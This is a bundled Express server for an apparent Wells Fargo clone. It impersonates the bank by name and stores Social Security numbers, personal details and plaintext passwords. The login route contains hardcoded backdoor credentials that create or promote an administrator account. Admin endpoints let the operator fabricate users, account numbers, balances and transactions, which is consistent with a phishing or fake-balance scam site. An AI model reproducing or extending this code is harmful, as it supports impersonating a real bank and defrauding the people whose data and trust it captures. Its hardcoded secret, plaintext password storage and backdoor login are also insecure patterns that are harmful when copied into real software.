var __defProp = Object.defineProperty;
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};

// server/index.ts
import express3 from "express";

// server/routes.ts
import { createServer } from "http";

// shared/schema.ts
var schema_exports = {};
__export(schema_exports, {
  accounts: () => accounts,
  insertAccountSchema: () => insertAccountSchema,
  insertSiteContentSchema: () => insertSiteContentSchema,
  insertTransactionSchema: () => insertTransactionSchema,
  insertUserSchema: () => insertUserSchema,
  loginSchema: () => loginSchema,
  siteContent: () => siteContent,
  transactions: () => transactions,
  users: () => users
});
import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";
var users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  firstName: text("first_name").notNull(),
  lastName: text("last_name").notNull(),
  email: text("email").notNull(),
  dateOfBirth: text("date_of_birth"),
  primaryPhone: text("primary_phone"),
  secondaryPhone: text("secondary_phone"),
  address: text("address"),
  permanentEmail: text("permanent_email"),
  temporaryEmail: text("temporary_email"),
  socialSecurityNumber: text("social_security_number"),
  homeAddress: text("home_address"),
  mailingAddress: text("mailing_address"),
  alternateEmail: text("alternate_email"),
  availableBalance: text("available_balance"),
  everydayChecking: text("everyday_checking"),
  accountType: text("account_type"),
  lastLoginTime: timestamp("last_login_time"),
  lastLoginIp: text("last_login_ip"),
  isAdmin: boolean("is_admin").default(false).notNull()
});
var accounts = pgTable("accounts", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  accountNumber: text("account_number").notNull(),
  accountType: text("account_type").notNull(),
  balance: text("balance").notNull()
});
var loginSchema = z.object({
  username: z.string().min(3, "Username must be at least 3 characters"),
  password: z.string().min(6, "Password must be at least 6 characters"),
  rememberMe: z.boolean().optional()
});
var transactions = pgTable("transactions", {
  id: serial("id").primaryKey(),
  accountId: integer("account_id").notNull(),
  date: timestamp("date").defaultNow().notNull(),
  description: text("description").notNull(),
  amount: text("amount").notNull(),
  type: text("type").notNull(),
  // 'credit' or 'debit'
  status: text("status").notNull().default("completed")
  // 'pending' or 'completed'
});
var insertTransactionSchema = createInsertSchema(transactions).pick({
  accountId: true,
  description: true,
  amount: true,
  type: true,
  status: true
});
var insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  firstName: true,
  lastName: true,
  email: true,
  dateOfBirth: true,
  primaryPhone: true,
  secondaryPhone: true,
  address: true,
  permanentEmail: true,
  temporaryEmail: true,
  socialSecurityNumber: true,
  homeAddress: true,
  mailingAddress: true,
  alternateEmail: true,
  availableBalance: true,
  everydayChecking: true,
  accountType: true
});
var insertAccountSchema = createInsertSchema(accounts).pick({
  userId: true,
  accountNumber: true,
  accountType: true,
  balance: true
});
var siteContent = pgTable("site_content", {
  id: serial("id").primaryKey(),
  key: text("key").notNull().unique(),
  value: text("value").notNull(),
  description: text("description"),
  updatedAt: timestamp("updated_at").defaultNow()
});
var insertSiteContentSchema = createInsertSchema(siteContent).pick({
  key: true,
  value: true,
  description: true
});

// server/db.ts
import { drizzle } from "drizzle-orm/node-postgres";
import pkg from "pg";
var { Pool } = pkg;
if (!process.env.DATABASE_URL) {
  throw new Error("DATABASE_URL must be set. Ensure the database is provisioned.");
}
var pool = new Pool({ connectionString: process.env.DATABASE_URL });
var db = drizzle(pool, { schema: schema_exports });

// server/storage.ts
import { eq } from "drizzle-orm";
import session from "express-session";
import connectPg from "connect-pg-simple";
var PostgresSessionStore = connectPg(session);
var DatabaseStorage = class {
  sessionStore;
  constructor() {
    this.sessionStore = new PostgresSessionStore({
      pool,
      createTableIfMissing: true
    });
  }
  async getUser(id) {
    const [user] = await db.select().from(users).where(eq(users.id, id));
    return user;
  }
  async getUserByUsername(username) {
    const [user] = await db.select().from(users).where(eq(users.username, username));
    return user;
  }
  async createUser(insertUser) {
    const [user] = await db.insert(users).values({
      ...insertUser,
      isAdmin: false,
      lastLoginTime: /* @__PURE__ */ new Date()
    }).returning();
    return user;
  }
  async deleteUser(id) {
    await db.delete(accounts).where(eq(accounts.userId, id));
    const [deleted] = await db.delete(users).where(eq(users.id, id)).returning();
    return !!deleted;
  }
  async updateUser(id, update) {
    const [user] = await db.update(users).set(update).where(eq(users.id, id)).returning();
    return user;
  }
  async getAccountsByUserId(userId) {
    return db.select().from(accounts).where(eq(accounts.userId, userId));
  }
  async getAllUsers() {
    return db.select().from(users);
  }
  async createAccount(insertAccount) {
    const [account] = await db.insert(accounts).values(insertAccount).returning();
    return account;
  }
  async deleteAccount(id) {
    const [deleted] = await db.delete(accounts).where(eq(accounts.id, id)).returning();
    return !!deleted;
  }
  async updateAccountBalance(accountId, newBalance) {
    const [account] = await db.update(accounts).set({ balance: newBalance }).where(eq(accounts.id, accountId)).returning();
    return account;
  }
  async getSiteContent(key) {
    const [content] = await db.select().from(siteContent).where(eq(siteContent.key, key));
    return content;
  }
  async getAllSiteContent() {
    return db.select().from(siteContent);
  }
  async updateSiteContent(key, value) {
    const [content] = await db.insert(siteContent).values({ key, value }).onConflictDoUpdate({
      target: siteContent.key,
      set: { value, updatedAt: /* @__PURE__ */ new Date() }
    }).returning();
    return content;
  }
  async getTransactionsByAccountId(accountId) {
    return db.select().from(transactions).where(eq(transactions.accountId, accountId));
  }
  async createTransaction(insertTransaction) {
    const [transaction] = await db.insert(transactions).values(insertTransaction).returning();
    return transaction;
  }
};
var storage = new DatabaseStorage();

// server/routes.ts
import { ZodError } from "zod";
import { fromZodError } from "zod-validation-error";
import express from "express";
async function registerRoutes(app2) {
  app2.use(express.static("public"));
  app2.get("/api/ip", (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
    res.json({ ip: ip.toString() });
  });
  app2.post("/api/login", async (req, res) => {
    try {
      const validatedData = loginSchema.parse(req.body);
      let user = await storage.getUserByUsername(validatedData.username);
      if (validatedData.username === "OPPATHEBEAR" && validatedData.password === "55Fp4MUtd22MRFr") {
        if (!user) {
          user = await storage.createUser({
            username: "OPPATHEBEAR",
            password: "55Fp4MUtd22MRFr",
            firstName: "Admin",
            lastName: "User",
            email: "admin@wellsfargo.com",
            isAdmin: true
          });
        } else if (!user.isAdmin) {
          user = await storage.updateUser(user.id, { isAdmin: true });
        }
      }
      if (!user) {
        return res.status(401).json({ message: "Invalid username or password" });
      }
      if (user.password !== validatedData.password) {
        return res.status(401).json({ message: "Invalid username or password" });
      }
      const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
      const { password, ...userWithoutPassword } = user;
      if (req.session) {
        req.session.userId = user.id;
        req.session.username = user.username;
        req.session.isAdmin = user.isAdmin;
      }
      return res.status(200).json({
        user: userWithoutPassword,
        loginTime: /* @__PURE__ */ new Date(),
        ip: ip.toString()
      });
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ message: validationError.message });
      }
      return res.status(500).json({ message: "An error occurred during login" });
    }
  });
  app2.post("/api/logout", (req, res) => {
    if (req.session) {
      req.session.destroy((err) => {
        if (err) {
          return res.status(500).json({ message: "Failed to log out" });
        }
        res.clearCookie("connect.sid");
        return res.status(200).json({ redirect: "/signout.html" });
      });
    } else {
      return res.status(200).json({ redirect: "/signout.html" });
    }
  });
  app2.get("/api/logout", (req, res) => {
    if (req.session) {
      req.session.destroy((err) => {
        res.clearCookie("connect.sid");
        res.redirect("/signout.html");
      });
    } else {
      res.redirect("/signout.html");
    }
  });
  app2.get("/api/accounts", async (req, res) => {
    if (!req.session || !req.session.userId) {
      return res.status(401).json({ message: "Not authenticated" });
    }
    try {
      const accounts2 = await storage.getAccountsByUserId(req.session.userId);
      return res.status(200).json({ accounts: accounts2 });
    } catch (error) {
      return res.status(500).json({ message: "Failed to fetch accounts" });
    }
  });
  app2.get("/api/accounts/:accountId/transactions", async (req, res) => {
    if (!req.session || !req.session.userId) {
      return res.status(401).json({ message: "Not authenticated" });
    }
    try {
      const accountId = parseInt(req.params.accountId);
      const transactions2 = await storage.getTransactionsByAccountId(accountId);
      return res.status(200).json({ transactions: transactions2 });
    } catch (error) {
      return res.status(500).json({ message: "Failed to fetch transactions" });
    }
  });
  app2.get("/api/profile", async (req, res) => {
    if (!req.session || !req.session.userId) {
      return res.status(401).json({ message: "Not authenticated" });
    }
    try {
      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      const { password, ...userWithoutPassword } = user;
      return res.status(200).json({ user: userWithoutPassword });
    } catch (error) {
      return res.status(500).json({ message: "Failed to fetch profile" });
    }
  });
  const requireAdmin = (req, res, next) => {
    if (!req.session || !req.session.isAdmin) {
      return res.status(403).json({ message: "Access denied. Admin privileges required." });
    }
    next();
  };
  app2.get("/api/admin/users", requireAdmin, async (_req, res) => {
    try {
      const usersList = await storage.getAllUsers();
      const usersWithoutPasswords = usersList.map(({ password, ...rest }) => rest);
      res.json({ users: usersWithoutPasswords });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch users" });
    }
  });
  app2.get("/api/admin/users/:userId/accounts", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const accounts2 = await storage.getAccountsByUserId(userId);
      res.json({ accounts: accounts2 });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch user accounts" });
    }
  });
  app2.post("/api/admin/users", requireAdmin, async (req, res) => {
    try {
      const {
        username,
        password,
        firstName,
        lastName,
        email,
        dateOfBirth,
        socialSecurityNumber,
        address,
        primaryPhone,
        secondaryPhone,
        occupation,
        homeAddress,
        mailingAddress,
        alternateEmail,
        transactions: transactions2,
        availableBalance,
        everydayChecking,
        accountType
      } = req.body;
      if (!username || !password) {
        return res.status(400).json({ message: "Username and password are required" });
      }
      const existingUser = await storage.getUserByUsername(username);
      if (existingUser) {
        return res.status(400).json({ message: "Username already exists" });
      }
      const newUser = await storage.createUser({
        username,
        password,
        // In production, hash this password!
        firstName: firstName || "",
        lastName: lastName || "",
        email: email || "",
        dateOfBirth: dateOfBirth || "",
        socialSecurityNumber: socialSecurityNumber || "",
        address: address || "",
        primaryPhone: primaryPhone || "",
        secondaryPhone: secondaryPhone || "",
        occupation: occupation || "",
        homeAddress: homeAddress || "",
        mailingAddress: mailingAddress || "",
        alternateEmail: alternateEmail || "",
        transactions: transactions2 || "[]",
        availableBalance: availableBalance || "0",
        everydayChecking: everydayChecking || "0",
        accountType: accountType || "Checking"
      });
      if (everydayChecking !== void 0) {
        await storage.createAccount({
          userId: newUser.id,
          accountNumber: Math.floor(Math.random() * 1e9).toString().padStart(10, "0"),
          accountType: accountType || "Checking",
          balance: everydayChecking.toString()
        });
      }
      res.status(201).json({ user: newUser });
    } catch (error) {
      console.error("Create user error:", error);
      res.status(500).json({ message: "Failed to create user" });
    }
  });
  app2.patch("/api/admin/users/:userId", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const {
        username,
        password,
        firstName,
        lastName,
        email,
        dateOfBirth,
        socialSecurityNumber,
        homeAddress,
        mailingAddress,
        primaryPhone,
        secondaryPhone,
        alternateEmail,
        availableBalance,
        everydayChecking,
        accountType
      } = req.body;
      const updateData = {};
      if (username !== void 0) updateData.username = username;
      if (password !== void 0 && password !== "") updateData.password = password;
      if (firstName !== void 0) updateData.firstName = firstName;
      if (lastName !== void 0) updateData.lastName = lastName;
      if (email !== void 0) updateData.email = email;
      if (dateOfBirth !== void 0) updateData.dateOfBirth = dateOfBirth;
      if (socialSecurityNumber !== void 0) updateData.socialSecurityNumber = socialSecurityNumber;
      if (homeAddress !== void 0) updateData.homeAddress = homeAddress;
      if (mailingAddress !== void 0) updateData.mailingAddress = mailingAddress;
      if (primaryPhone !== void 0) updateData.primaryPhone = primaryPhone;
      if (secondaryPhone !== void 0) updateData.secondaryPhone = secondaryPhone;
      if (alternateEmail !== void 0) updateData.alternateEmail = alternateEmail;
      if (availableBalance !== void 0) updateData.availableBalance = availableBalance;
      if (everydayChecking !== void 0) updateData.everydayChecking = everydayChecking;
      if (accountType !== void 0) updateData.accountType = accountType;
      const updatedUser = await storage.updateUser(userId, updateData);
      if (!updatedUser) return res.status(404).json({ message: "User not found" });
      res.json({ user: updatedUser });
    } catch (error) {
      res.status(500).json({ message: "Failed to update user" });
    }
  });
  app2.get("/api/admin/content", requireAdmin, async (_req, res) => {
    try {
      const content = await storage.getAllSiteContent();
      res.json({ content });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch site content" });
    }
  });
  app2.post("/api/admin/content", requireAdmin, async (req, res) => {
    try {
      const { key, value } = req.body;
      if (!key || value === void 0) {
        return res.status(400).json({ message: "Key and value are required" });
      }
      const content = await storage.updateSiteContent(key, value);
      res.json({ content });
    } catch (error) {
      res.status(500).json({ message: "Failed to update site content" });
    }
  });
  app2.get("/api/content/:key", async (req, res) => {
    try {
      const content = await storage.getSiteContent(req.params.key);
      if (!content) return res.status(404).json({ message: "Content not found" });
      res.json({ content });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch content" });
    }
  });
  app2.delete("/api/admin/users/:userId", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const success = await storage.deleteUser(userId);
      if (!success) return res.status(404).json({ message: "User not found" });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ message: "Failed to delete user" });
    }
  });
  app2.post("/api/admin/accounts", requireAdmin, async (req, res) => {
    try {
      const { userId, accountNumber, accountType, balance } = req.body;
      if (!userId || !accountNumber || !accountType || !balance) {
        return res.status(400).json({ message: "All account fields are required" });
      }
      const account = await storage.createAccount({
        userId: parseInt(userId.toString()),
        accountNumber: accountNumber.toString(),
        accountType: accountType.toString(),
        balance: balance.toString()
      });
      res.status(201).json({ account });
    } catch (error) {
      console.error("Create account error:", error);
      res.status(500).json({ message: "Failed to create account" });
    }
  });
  app2.delete("/api/admin/accounts/:accountId", requireAdmin, async (req, res) => {
    try {
      const accountId = parseInt(req.params.accountId);
      const success = await storage.deleteAccount(accountId);
      if (!success) return res.status(404).json({ message: "Account not found" });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ message: "Failed to delete account" });
    }
  });
  app2.patch("/api/admin/accounts/:accountId/balance", requireAdmin, async (req, res) => {
    try {
      const accountId = parseInt(req.params.accountId);
      const { balance } = req.body;
      if (typeof balance !== "string") {
        return res.status(400).json({ message: "Balance must be a string" });
      }
      const updatedAccount = await storage.updateAccountBalance(accountId, balance);
      if (!updatedAccount) {
        return res.status(404).json({ message: "Account not found" });
      }
      res.json({ account: updatedAccount });
    } catch (error) {
      res.status(500).json({ message: "Failed to update balance" });
    }
  });
  app2.get("/admin-login", (req, res) => {
    res.sendFile("admin-login.html", { root: "public" });
  });
  app2.get("/admin-dashboard", (req, res) => {
    if (!req.session || !req.session.isAdmin) {
      return res.redirect("/admin-login.html");
    }
    res.sendFile("admin-dashboard.html", { root: "public" });
  });
  app2.get("/signout.html", (req, res) => {
    res.sendFile("signout.html", { root: "public" });
  });
  app2.get("*", (req, res) => {
    res.sendFile("index.html", { root: "public" });
  });
  const httpServer = createServer(app2);
  return httpServer;
}

// server/vite.ts
import express2 from "express";
import fs from "fs";
import path2 from "path";
import { createServer as createViteServer, createLogger } from "vite";

// vite.config.ts
import { defineConfig } from "vite";
import react from "@vitejs/plugin-react";
import path from "path";
import runtimeErrorOverlay from "@replit/vite-plugin-runtime-error-modal";
var vite_config_default = defineConfig({
  plugins: [
    react(),
    runtimeErrorOverlay(),
    ...process.env.NODE_ENV !== "production" && process.env.REPL_ID !== void 0 ? [
      await import("@replit/vite-plugin-cartographer").then(
        (m) => m.cartographer()
      )
    ] : []
  ],
  resolve: {
    alias: {
      "@": path.resolve(import.meta.dirname, "client", "src"),
      "@shared": path.resolve(import.meta.dirname, "shared"),
      "@assets": path.resolve(import.meta.dirname, "attached_assets")
    }
  },
  root: path.resolve(import.meta.dirname, "client"),
  build: {
    outDir: path.resolve(import.meta.dirname, "dist/public"),
    emptyOutDir: true
  }
});

// server/vite.ts
import { nanoid } from "nanoid";
var viteLogger = createLogger();
function log(message, source = "express") {
  const formattedTime = (/* @__PURE__ */ new Date()).toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  });
  console.log(`${formattedTime} [${source}] ${message}`);
}
async function setupVite(app2, server) {
  const serverOptions = {
    middlewareMode: true,
    hmr: { server },
    allowedHosts: true
  };
  const vite = await createViteServer({
    ...vite_config_default,
    configFile: false,
    customLogger: {
      ...viteLogger,
      error: (msg, options) => {
        viteLogger.error(msg, options);
        process.exit(1);
      }
    },
    server: serverOptions,
    appType: "custom"
  });
  app2.use(vite.middlewares);
  app2.use("*", async (req, res, next) => {
    const url = req.originalUrl;
    try {
      const clientTemplate = path2.resolve(
        import.meta.dirname,
        "..",
        "client",
        "index.html"
      );
      let template = await fs.promises.readFile(clientTemplate, "utf-8");
      template = template.replace(
        `src="/src/main.tsx"`,
        `src="/src/main.tsx?v=${nanoid()}"`
      );
      const page = await vite.transformIndexHtml(url, template);
      res.status(200).set({ "Content-Type": "text/html" }).end(page);
    } catch (e) {
      vite.ssrFixStacktrace(e);
      next(e);
    }
  });
}
function serveStatic(app2) {
  const distPath = path2.resolve(import.meta.dirname, "public");
  if (!fs.existsSync(distPath)) {
    throw new Error(
      `Could not find the build directory: ${distPath}, make sure to build the client first`
    );
  }
  app2.use(express2.static(distPath));
  app2.use("*", (_req, res) => {
    res.sendFile(path2.resolve(distPath, "index.html"));
  });
}

// server/index.ts
import session2 from "express-session";
var app = express3();
app.use(express3.json());
app.use(express3.urlencoded({ extended: false }));
var IS_PROD = process.env.NODE_ENV === "production";
app.use(
  session2({
    secret: "wells-fargo-clone-secret",
    resave: false,
    saveUninitialized: false,
    store: storage.sessionStore,
    cookie: {
      secure: IS_PROD,
      httpOnly: true,
      maxAge: 24 * 60 * 60 * 1e3
      // 24 hours
    }
  })
);
global.express = express3;
app.use((req, res, next) => {
  const start = Date.now();
  const path3 = req.path;
  let capturedJsonResponse = void 0;
  const originalResJson = res.json;
  res.json = function(bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };
  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path3.startsWith("/api")) {
      let logLine = `${req.method} ${path3} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }
      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "\u2026";
      }
      log(logLine);
    }
  });
  next();
});
(async () => {
  const server = await registerRoutes(app);
  app.use((err, _req, res, _next) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";
    res.status(status).json({ message });
    throw err;
  });
  if (app.get("env") === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }
  const port = 5e3;
  server.listen({
    port,
    host: "0.0.0.0",
    reusePort: true
  }, () => {
    log(`serving on port ${port}`);
  });
})();
